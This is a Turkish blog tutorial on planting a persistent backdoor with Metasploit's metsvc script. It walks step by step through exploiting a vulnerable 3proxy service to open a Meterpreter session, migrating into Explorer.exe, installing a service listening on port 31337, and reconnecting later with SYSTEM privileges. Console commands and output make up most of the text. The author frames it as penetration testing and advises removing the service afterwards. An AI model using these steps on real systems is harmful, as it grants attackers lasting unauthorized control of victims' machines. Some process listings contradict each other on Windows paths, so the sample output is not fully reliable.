---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-15T13:56:00Z"
excerpt: Hedef sisteme giriş yaptıktan sonra, kalıcılık sağlamanın bir yolu da metsvc servisini
  kullanmaktır. Bu servis sayesinde istediğiniz zaman tekrar Meterpreter oturumu açabilirsiniz. metsvc hakkında
  detaylı bilgiyi bağlantıyı kullanarak inceleyebilirsiniz.
guid: https://www.siberoloji.com/?p=1215
id: 1215
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Backdoor
url: /tr/msf-meterpreter-backdoor/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="meterpreter-metsvc">Meterpreter metsvc 
<!-- /wp:heading -->

  Hedef sisteme giriş yaptıktan sonra, kalıcılık sağlamanın bir yolu da&nbsp;<code>metsvc</code>&nbsp;servisini kullanmaktır. Bu servis sayesinde istediğiniz zaman tekrar Meterpreter oturumu açabilirsiniz.&nbsp;<a href="http://www.phreedom.org/software/metsvc/">metsvc</a>&nbsp;hakkında detaylı bilgiyi bağlantıyı kullanarak inceleyebilirsiniz. 
 

  metsvc hakkında bilmeniz gereken önemli bir noktayı vurgulayalım.&nbsp;***Bu servisi yerleştirdiğiniz bilgisayarın ilgili portunu bulan herkes bu arka kapıyı kullanabilir.*** &nbsp;Pentest işlemleri esnasında kullandıktan sonra iptal etmelisiniz yoksa sistemi, art niyetli kişilere açık duruma getirmiş olursunuz. Bu da sistem sahiplerinin hiç hoşuna gitmeyebilir. 
 

  Öncelikle sistemde, bulduğunuz bir açıklıkla ilgili modülü kullanarak meterpreter oturumu açalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** 3proxy***)***  ***&gt;***  exploit

***[*** ******* ***]***  Started reverse handler
***[*** ******* ***]***  Trying target Windows XP SP2 - English...
***[*** ******* ***]***  Sending stage ***(*** 719360 bytes***)*** 
***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 192.168.1.101:4444 -&gt; 192.168.1.104:1983***)*** 
</code></pre>
<!-- /wp:code -->

  <code>ps</code>&nbsp;komutuyla&nbsp;<code>Explorer.exe</code>&nbsp;programının PID numarasını bulalım ve&nbsp;<code>migrate</code>&nbsp;komutuyla bu PID numaralı programa geçiş yapalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps

Process list
***============*** 

    PID   Name                 Path
    ---   ----                 ----
    132   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
    176   svchost.exe          C:\WINDOWS\system32\svchost.exe
    440   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
    632   Explorer.EXE         C:\WINDOWS\Explorer.EXE
    796   smss.exe             \SystemRoot\System32\smss.exe
    836   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    844   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    884   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
    908   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
    952   services.exe         C:\WINDOWS\system32\services.exe
    964   lsass.exe            C:\WINDOWS\system32\lsass.exe
    1120  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
    1136  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1236  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1560  alg.exe              C:\WINDOWS\System32\alg.exe
    1568  WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
    1596  jusched.exe          C:\Program Files\Java\jre6\b***in*** \jusched.exe
    1656  msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
    1748  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
    1928  jqs.exe              C:\Program Files\Java\jre6\b***in*** \jqs.exe
    2028  snmp.exe             C:\WINDOWS\System32\snmp.exe
    2840  3proxy.exe           C:\3proxy\b***in*** \3proxy.exe
    3000  mmc.exe              C:\WINDOWS\system32\mmc.exe

meterpreter ***&gt;***  migrate 632
***[*** ******* ***]***  Migrating to 632...
***[*** ******* ***]***  Migration completed successfully.
</code></pre>
<!-- /wp:code -->

  <code>metsvc</code>&nbsp;modülünü kullanmadan önce yardımı görüntüleyelim ve bize hangi olanakları sağladığını görelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run metsvc -h
***[*** ******* ***]*** 
OPTIONS:

    -A        Automatically start a matching multi/handler to connect to the service
    -h        This help menu
    -r        Uninstall an existing Meterpreter service ***(*** files must be deleted manually***)*** 

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  <code>metsvc</code>, normalde bize geri bağlantı da sağlayan bir programdır ancak biz zaten Meterpreter oturumu açtığımız için geri bağlantıya şimdilik ihtiyacımız yok. Sadece programı çalıştıralım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run metsvc
***[*** ******* ***]***  Creating a meterpreter service on port 31337
***[*** ******* ***]***  Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
***[*** ******* ***]***   ***&gt;&gt;***  Uploading metsrv.dll...
***[*** ******* ***]***   ***&gt;&gt;***  Uploading metsvc-server.exe...
***[*** ******* ***]***   ***&gt;&gt;***  Uploading metsvc.exe...
***[*** ******* ***]***  Starting the service...
***[*** ******* ***]***       *******  Installing service metsvc
 *******  Starting service
Service metsvc successfully installed.

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  <code>metsvc</code>&nbsp;başladı ve artık bağlanmak için bekliyor. Şimdi bu servisle nasıl haberleşeceğimizi görelim. 
 

  Hedef sistemde dinleme durumundaki&nbsp;<code>metsvc</code>&nbsp;ile haberleşmek için&nbsp;<code>windows/metsvc_bind_tcp</code>&nbsp;payload modülünü kullanacağız. Modülü, aşağıdaki örnekte olduğu gibi aktif hale getirelim ve gerekli PORT ayarlarını yapalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use exploit/multi/handler
msf exploit***(*** handler***)***  ***&gt;***  set PAYLOAD windows/metsvc_bind_tcp
PAYLOAD ***=&gt;***  windows/metsvc_bind_tcp
msf exploit***(*** handler***)***  ***&gt;***  set LPORT 31337
LPORT ***=&gt;***  31337
msf exploit***(*** handler***)***  ***&gt;***  set RHOST 192.168.1.104
RHOST ***=&gt;***  192.168.1.104
msf exploit***(*** handler***)***  ***&gt;***  show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options ***(*** windows/metsvc_bind_tcp***)*** :

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LPORT     31337            yes       The local port
   RHOST     192.168.1.104    no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit***(*** handler***)***  ***&gt;***  exploit

***[*** ******* ***]***  Starting the payload handler...
***[*** ******* ***]***  Started bind handler
***[*** ******* ***]***  Meterpreter session 2 opened ***(*** 192.168.1.101:60840 -&gt; 192.168.1.104:31337***)*** 
</code></pre>
<!-- /wp:code -->

  Gördüğünüz gibi&nbsp;<code>session 2</code>&nbsp;otomatik olarak açıldı. Şimdi,&nbsp;<code>metsvc</code>&nbsp;servisinin hedef bilgisayarda hangi PID numarasıyla çalıştığına bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps

Process list
***============*** 

   PID   Name               Path                                                  
   ---   ----               ----                                                  
   140   smss.exe           \SystemRoot\System32\smss.exe                         
   168   csrss.exe          \??\C:\WINNT\system32\csrss.exe                       
   188   winlogon.exe       \??\C:WINNT\system32\winlogon.exe                    
   216   services.exe       C:\WINNT\system32\services.exe                        
   228   lsass.exe          C:\WINNT\system32\lsass.exe                           
   380   svchost.exe        C:\WINNT\system32\svchost.exe                         
   408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                         
   444   svchost.exe        C:\WINNT\System32\svchost.exe                         
   480   regsvc.exe         C:\WINNT\system32\regsvc.exe                          
   500   MSTask.exe         C:\WINNT\system32\MSTask.exe                          
   528   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
   564   metsvc.exe         c:\WINNT\my\metsvc.exe                                
   588   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                    
   676   cmd.exe            C:\WINNT\System32\cmd.exe                             
   724   cmd.exe            C:\WINNT\System32\cmd.exe                             
   764   mmc.exe            C:\WINNT\system32\mmc.exe                             
   816   metsvc-server.exe  c:\WINNT\my\metsvc-server.exe                         
   888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe   
   896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe   
   940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe          
   972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
   1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
   1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe

meterpreter ***&gt;***  pwd
C:\WINDOWS\system32
meterpreter ***&gt;***  getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Çıktıdan görülebileceği gibi,&nbsp;<code>metsvc</code>&nbsp;programı, 564 PID numarasıyla çalışmaktadır. Artık istediğiniz zaman, hedef bilgisayarda dinleme yapan programa,&nbsp;<code>windows/metsvc_bind_tcp</code>&nbsp;payload modülünü kullanarak bağlanabiliriz. 
 

  Tekrar hatırlatmak gerekirse, güvenlik testi işlemleriniz bittiğinde&nbsp;<code>metsvc</code>&nbsp;programını sistemden silmelisiniz. 
 